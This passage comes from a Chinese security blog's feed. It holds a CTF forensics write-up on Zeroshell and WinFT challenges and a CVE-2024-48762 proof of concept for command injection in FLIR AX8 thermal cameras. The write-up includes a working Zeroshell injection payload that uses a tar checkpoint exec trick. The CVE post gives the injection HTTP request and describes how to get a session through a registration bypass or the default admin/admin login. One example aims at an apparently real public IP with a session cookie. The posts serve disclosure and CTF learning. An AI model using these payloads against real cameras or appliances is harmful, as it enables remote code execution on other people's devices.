class="hljs-number">7849</span><br>unix  <span class="hljs-number">3</span>      [ ]         DGRAM                    <span class="hljs-number">7850</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">18318</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">15992</span><br>flag&#123;<span class="hljs-number">202.115</span><span class="hljs-number">.89</span><span class="hljs-number">.103</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Zeroshell-4"><a href="#Zeroshell-4" class="headerlink" title="Zeroshell_4"></a>Zeroshell_4</h3><ul><li>全局搜索目标ip<code>202.115.89.103</code></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826826.png" alt="img"></p><ul><li>Exp find全局搜一下</li><li>在&#x2F;Database&#x2F;目录下，和 flag一样</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;.nginx&#125;<br></code></pre></td></tr></table></figure><h3 id="Zeroshell-5"><a href="#Zeroshell-5" class="headerlink" title="Zeroshell_5"></a>Zeroshell_5</h3><p>提取木马文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">wget &quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27cat%20/Database/.nginx%27%0A%27&quot;<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826074.png" alt="img"></p><p>得到的文件拖到IDA中打开，查看字符串，发现IP后面跟着一串字符，猜测为加密秘钥，尝试提交，结果正确</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826028.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;11223344qweasdzxc&#125;<br></code></pre></td></tr></table></figure><h3 id="WinFT-1"><a href="#WinFT-1" class="headerlink" title="WinFT_1"></a>WinFT_1</h3><ul><li>老规矩，先net一下看看</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">netstat -a<br></code></pre></td></tr></table></figure><ul><li>明显有一个外部地址不一样</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826972.png" alt="img"></p><ul><li><code>Wireshark</code>看看包，先全局搜索下<code>miscsecure</code>,没有，那咱们一个字符一个字符删看看，一下看到一个<code>.exe</code>.</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826118.png" alt="img"></p><ul><li>这个<code>exe</code>文件大概率是马,点开看，与咱们一开始<code>net</code>的对上了，刚刚那个<code>miscsecure</code>应该是<code>192.168.116.130</code></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826994.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;miscsecure.com:<span class="hljs-number">192.168</span><span class="hljs-number">.116</span><span class="hljs-number">.130</span>:<span class="hljs-number">443</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="WinFT-2"><a href="#WinFT-2" class="headerlink" title="WinFT_2"></a>WinFT_2</h3><ul><li>查看任务计划程序，很明显的定时启动木马</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826135.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=<br></code></pre></td></tr></table></figure><ul><li><code>base64</code></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826302.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">Nice，flag <span class="hljs-keyword">is</span> &#123;AES_encryption_algorithm_is_an_excellent_encryption_algorithm&#125;<br></code></pre></td></tr></table></figure><h3 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h3><p>打开表格，搜索134.6.4.12，tcp中最早的即为所求</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241827813.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-48762</title>
    <link href="/2024/10/17/CVE-2024-48762/"/>
    <url>/2024/10/17/CVE-2024-48762/</url>
    
    <content type="html"><![CDATA[<h2 id="CVE-2024-48762"><a href="#CVE-2024-48762" class="headerlink" title="CVE-2024-48762"></a>CVE-2024-48762</h2><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>Command injection vulnerability in &#x2F;usr&#x2F;www&#x2F;application&#x2F;models&#x2F;settingscamera.php  in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the value parameter.</p><h3 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h3><p>This vulnerability is a backend issue that requires obtaining cookies. It  can exploit the unauthorized access vulnerability for arbitrary user  registration found at &#x2F;tools&#x2F;test_login.php?action&#x3D;register. After  registering a new user, cookies can be obtained to achieve RCE (Remote  Code Execution). </p><p>Also.Under normal circumstances, it has a weak password vulnerability with  default account credentials being ‘admin’ for both user and password too.  You can also obtain a cookie through this method.</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /settings/applyfirmware/;id&gt;test123.txt;/false HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: XXXX<br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span>, i<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: XXXX<br><span class="hljs-attribute">Cookie</span>: XXXX<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/png,image/svg+xml,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">130</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">130</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>For example</p><ul><li>this cookie must be changed</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /settings/applyfirmware/;id&gt;test123.txt;/false HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">222.103.211.89:8004</span><br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span>, i<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">222.103.211.89:8004</span>/<br><span class="hljs-attribute">Cookie</span>: theme=light; distanceUnit=metric; temperatureUnit=celsius; showCameraId=false; clientTimeZoneOffset=-<span class="hljs-number">480</span>; clientTimeZoneDST=<span class="hljs-number">0</span>; PHPSESSID=fede7f79f208effcb87474d02fe6d53d<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/png,image/svg+xml,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">130</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">130</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X</span>-Powered-By: PHP/<span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">14</span><br><span class="hljs-attribute">Expires</span>: Thu, <span class="hljs-number">19</span> Nov <span class="hljs-number">1981</span> <span class="hljs-number">08</span>:<span class="hljs-number">52</span>:<span class="hljs-number">00</span> GMT<br><span class="hljs-attribute">Cache</span>-Control: no-store, no-cache, must-revalidate, post-check=<span class="hljs-number">0</span>, pre-check=<span class="hljs-number">0</span><br><span class="hljs-attribute">Pragma</span>: no-cache<br><span class="hljs-attribute">Content</span>-type: text/html<br><span class="hljs-attribute">Date</span>: Mon, <span class="hljs-number">11</span> Feb <span class="hljs-number">2002</span> <span class="hljs-number">09</span>:<span class="hljs-number">18</span>:<span class="hljs-number">49</span> GMT<br><span class="hljs-attribute">Server</span>: lighttpd/<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">33</span><br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412182135497.png" alt="image-1"></p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412182135157.png" alt="image-20241002225635281"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
